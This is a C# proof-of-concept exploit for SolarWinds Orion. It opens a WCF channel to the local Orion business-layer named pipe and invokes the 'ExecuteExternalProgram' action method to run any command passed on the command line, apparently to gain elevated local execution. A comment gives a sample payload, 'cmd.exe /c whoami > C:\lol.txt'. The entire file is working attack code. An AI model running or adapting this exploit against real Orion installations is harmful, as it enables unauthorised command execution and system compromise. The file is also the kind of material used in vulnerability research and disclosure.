using System;
using System.ServiceModel;
using SolarWinds.Orion.Core.Actions.Impl.ExecuteExternalProgram;
using SolarWinds.Orion.Common;
using System.Xml;

namespace orion
{
    class Program
    {
        private static NetNamedPipeBinding GetDefaultNetNamedPipeBinding()
        {
            XmlDictionaryReaderQuotas readerQuotas = new XmlDictionaryReaderQuotas
            {
                MaxArrayLength = int.MaxValue,
                MaxStringContentLength = int.MaxValue
            };
            return new NetNamedPipeBinding
            {
                ReaderQuotas = readerQuotas,
                MaxReceivedMessageSize = 2147483647L,
                MaxBufferSize = int.MaxValue,
                SendTimeout = TimeSpan.FromMinutes(3.0)
            };
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[i] Address: " + "net.pipe://localhost/orion/core/businesslayer");

            Console.WriteLine("[i] Creating ChannelFactory<ICoreBusinessLayer>...");
            ChannelFactory<ICoreBusinessLayer> channelFactory = new ChannelFactory<ICoreBusinessLayer>(
                GetDefaultNetNamedPipeBinding(),
                "net.pipe://localhost/orion/core/businesslayer"
            );

            Console.WriteLine("[i] Creating channel to named pipe...");
            ICoreBusinessLayer channel = channelFactory.CreateChannel();
            ExecuteExternalProgramConfiguration config = new ExecuteExternalProgramConfiguration();
            config.ProgramPath = args[0]; // e.g. "cmd.exe /c whoami > C:\\lol.txt";
            try
            {
                Console.WriteLine("[i] Executing InvokeActionMethod(\"ExecuteExternalProgram\")...");
                string result = channel.InvokeActionMethod("ExecuteExternalProgram", 
                    "ValidateAccess", SerializationHelper.ToXmlString(config));
                Console.WriteLine("[i] Success! Output: " + result);
            }
            catch (EndpointNotFoundException e)
            {
                Console.WriteLine("[x] EndpointNotFoundException - Please check to make sure SolarWinds.BusinessLayerHost.exe " +
                    "or the Orion Module Engine service is running.");
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] Unknown exception: " + e.ToString());
            }
        }
    }
}
